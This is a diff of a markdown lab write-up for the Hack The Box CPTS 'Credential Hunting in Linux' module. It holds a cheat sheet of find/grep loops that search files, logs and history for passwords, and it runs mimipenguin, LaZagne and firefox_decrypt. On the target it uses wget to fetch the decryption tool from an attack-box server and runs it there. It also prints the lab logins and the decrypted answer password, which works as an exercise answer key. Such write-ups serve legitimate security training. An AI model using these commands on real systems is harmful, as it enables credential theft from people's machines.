@@ -1,180 +1,206 @@
 ### CPTS / HTB Penetration Tester Path <br>
-### Password Attacks: Credential Hunting in Linux <br>
-<mark>hook it up with a follow if this helps.</mark> <br>
+### Password Attacks - Credential Hunting in Linux <br>
+<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
 🐦: @<a href="https://x.com/st8less">**st8less**</a>
 
 <br>
 <br>
 
-IP: 10.129.252.221
+---
 
-SSH to 10.129.252.221 (ACADEMY-PWATTACKS-NIX01) with user "kira" and password "L0vey0u1!"
+### Credential Hunting in Linux
+
+
+
+Search files / history / memory / keyrings for stored creds. Categories:
+
+| Category | Sources |
+|---|---|
+| Files | configs, DBs, notes, scripts, cronjobs, SSH keys |
+| History | logs, `.bash_history` |
+| Memory | LSASS-equivalents, in-memory creds |
+| Keyrings | browser stores, GNOME/KDE keyring |
+
+#### Find config files (`.conf` / `.config` / `.cnf`)
+
+```diff
++ $ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
+```
+
+<br>
+
+Grep for credential keywords inside found configs:
+
+```diff
++ $ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
+```
+
+<br>
+
+#### Databases
+
+```diff
++ $ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
+```
+
+<br>
+
+#### Notes (txt files + extension-less)
+
+```diff
++ $ find /home/* -type f -name "*.txt" -o ! -name "*.*"
+```
+
+<br>
+
+#### Scripts
+
+```diff
++ $ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
+```
+
+<br>
+
+#### Cron
+
+```diff
++ $ cat /etc/crontab
++ $ ls -la /etc/cron.*/
+```
+
+<br>
+
+#### Bash history & logs
+
+```diff
++ $ tail -n5 /home/*/.bash*
+```
+
+<br>
+
+Hunt for auth events / passwords across `/var/log`:
+
+```diff
++ $ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
+```
+
+<br>
+
+Key log files:
+
+| File | Contents |
+|---|---|
+| `/var/log/auth.log` | (Debian) auth events |
+| `/var/log/secure` | (RHEL) auth events |
+| `/var/log/syslog` | generic system |
+| `/var/log/cron` | cron jobs |
+| `/var/log/mysqld.log` | mysql |
+
+#### Memory dumpers
+
+[mimipenguin](https://github.com/huntergregal/mimipenguin) — root-required, parses GDM/SSH/keyring memory:
+
+```diff
++ $ sudo python3 mimipenguin.py
+```
+
+<br>
+
+[LaZagne](https://github.com/AlessandroZ/LaZagne) — much broader (browsers, SSH, git, env, AWS, Filezilla, KeePass, etc.):
+
+```diff
++ $ sudo python2.7 laZagne.py all
+```
+
+<br>
+
+#### Browser-stored creds (Firefox)
+
+```diff
++ $ cat .mozilla/firefox/<profile>/logins.json | jq .
+```
+
+<br>
+
+Decrypt with [firefox_decrypt](https://github.com/unode/firefox_decrypt) (Python 3.9):
+
+```diff
++ $ python3.9 firefox_decrypt.py
+```
+
+<br>
+
+Or via LaZagne:
+
+```diff
++ $ python3 laZagne.py browsers
+```
+
+<br>
+
+---
+
+<br>
+
+### Exercise
+
+IP: 10.129.252.221 — SSH as `kira` / `L0vey0u1!`.
 
 ---
 
 ### Question 1:
 Examine the target and find out the password of the user Will. Then, submit the password as the answer.
 
-Started an nmap scan in the background:
-```diff
-+ $ sudo nmap -sT -sC -sV -A -F 10.129.252.221
-```
+Quick nmap shows SSH/SMB/FTP. SSH in:
 
-	PORT    STATE SERVICE     VERSION
-	21/tcp  open  ftp         vsftpd 3.0.3
-	22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
-	| ssh-hostkey: 
-	|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
-	|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
-	|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
-	139/tcp open  netbios-ssn Samba smbd 4.6.2
-	445/tcp open  netbios-ssn Samba smbd 4.6.2
-	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
-	
-	Host script results:
-	| nbstat: NetBIOS name: NIX01, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
-	| Names:
-	|   NIX01<00>            Flags: <unique><active>
-	|   NIX01<03>            Flags: <unique><active>
-	|   NIX01<20>            Flags: <unique><active>
-	|   WORKGROUP<00>        Flags: <group><active>
-	|_  WORKGROUP<1e>        Flags: <group><active>
-	| smb2-time: 
-	|   date: 2025-10-18T08:08:25
-	|_  start_date: N/A
-	| smb2-security-mode: 
-	|   3:1:1: 
-	|_    Message signing enabled but not required
-
-We can see ftp, ssh and some smb shares. Lets ssh in with the given creds:
 ```diff
 + $ ssh kira@10.129.252.221
 ```
 
-	kira@nix01:~$
+<br>
 
-Okay lets look for the operating system and other users:
+Enumerate users (`/etc/passwd`):
+
 ```diff
-+ kira@nix01:~$ cat /etc/passwd | grep bash
++ kira@nix01:~$ cat /etc/passwd
 ```
 
-	root:x:0:0:root:/root:/bin/bash
 	kira:x:1000:1000::/home/kira:/bin/bash
 	will:x:1001:1001::/home/will:/bin/bash
 	sam:x:1002:1003::/home/sam:/bin/bash
 
-Poking around the fs we find some cheeky bash history:
+<br>
+
+`.bash_history` shows kira ran `firefox_decrypt.py` against profile `ytb95ytb.default-release/`:
+
 ```diff
 + kira@nix01:~$ cat .bash_history
 ```
 
-	cd
-	git clone https://github.com/unode/firefox_decrypt.git
-	cd firefox_decrypt/
-	ls
-	./firefox_decrypt.py 
-	su
-	./firefox_decrypt.py 
-	python3.9 firefox_decrypt.py 
-	cd ..
-	rm -rf firefox_decrypt/
-	vim .bash_history 
-	su
-	firefox 
-	su
-	firefox 
-	cd .mozilla/firefox/
-	ls
-	cd ytb95ytb.default-release/
-	ls
-	cat logins.json 
-	vim logins.json 
-	jq
-	su
-	ls
-	vim logins.json 
-	su
-	cd
-	cd .ssh/
-	ls
-	rm *
-	ssh-keygen -t rsa -m PEM
-	cat id_rsa.pub > authorized_keys
-	vim authorized_keys 
-	su
+<br>
 
-Looks like some foreshadowing to me. SOMEONE was running the FF decrypt tool on the `ytb95ytb.default-release/` FF user. Lets try that too.
+Inspect `logins.json`:
 
-After looking through the .mozilla folder, we can use this command to inspect the encrypted logins:
 ```diff
-+ kira@nix01:~$ cat ~/.mozilla/firefox/ytb95ytb.default-release/logins.json | jq .
++ kira@nix01:~/.mozilla/firefox/ytb95ytb.default-release$ cat logins.json | jq .
 ```
 
-	{
-	  "nextId": 2,
-	  "logins": [
-	    {
-	      "id": 1,
-	      "hostname": "https://dev.inlanefreight.com",
-	      "httpRealm": null,
-	      "formSubmitURL": "https://dev.inlanefreight.com",
-	      "usernameField": "email",
-	      "passwordField": "password",
-	      "encryptedUsername": "MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECEuPp+tkcSROBBikTaPORjVYFBK/x6zuYjnhWGHhp6xu2ok=",
-	      "encryptedPassword": "MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECFinWQ8t9QusBBg6tPWTkhxcMRHwvfUZBs9zUh8mQ6MgpYI=",
-	      "guid": "{317acef6-be5a-4df2-abfc-ce0566b6e975}",
-	      "encType": 1,
-	      "timeCreated": 1644420310215,
-	      "timeLastUsed": 1644420310215,
-	      "timePasswordChanged": 1644420310215,
-	      "timesUsed": 1
-	    }
-	  ],
-	  "potentiallyVulnerablePasswords": [],
-	  "dismissedBreachAlertsByLoginGUID": {},
-	  "version": 3
-	}
+<br>
 
-We could setup a share with samba, use impacket or just stand up a server on our attack box, but lets clone the ff decrypt repo first:
+#### Pull firefox_decrypt down via a quick HTTP server on attack box, run on target:
+
 ```diff
 + $ git clone https://github.com/unode/firefox_decrypt.git
-```
-
-	Cloning into 'firefox_decrypt'...
-	remote: Enumerating objects: 1382, done.
-	remote: Counting objects: 100% (292/292), done.
-	remote: Compressing objects: 100% (38/38), done.
-
-Cool, now serve it:
-```diff
 + $ python3 -m http.server
-```
-
-	Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-
-And download it nix side:
-```diff
 + kira@nix01:~/.mozilla/firefox$ wget -r -nH http://10.10.14.111:8000/firefox_decrypt
-```
-
-	FINISHED --2025-10-18 09:21:13--
-	Total wall clock time: 37s
-	Downloaded: 148 files, 3.3M in 4.8s (708 KB/s)
-
-We are so back baby, execute the script with py 3.9 for dependency issues:
-```diff
 + kira@nix01:~/.mozilla/firefox/firefox_decrypt$ python3.9 firefox_decrypt.py
 ```
 
-And now select the option that matches what we found in bash history earlier:
-
 	Select the Mozilla profile you wish to decrypt
-	1 -> lktd9y8y.default
 	2 -> ytb95ytb.default-release
-	2
-	
+
 	Website:   https://dev.inlanefreight.com
 	Username: 'will@inlanefreight.htb'
 	Password: 'TUqr7QfLTLhruhVbCP'
 
-🚩 found **TUqr7QfLTLh--edit--ruhVbCP**.
+&#x1F6A9; found **TUqr7QfLT--edit--LhruhVbCP**.
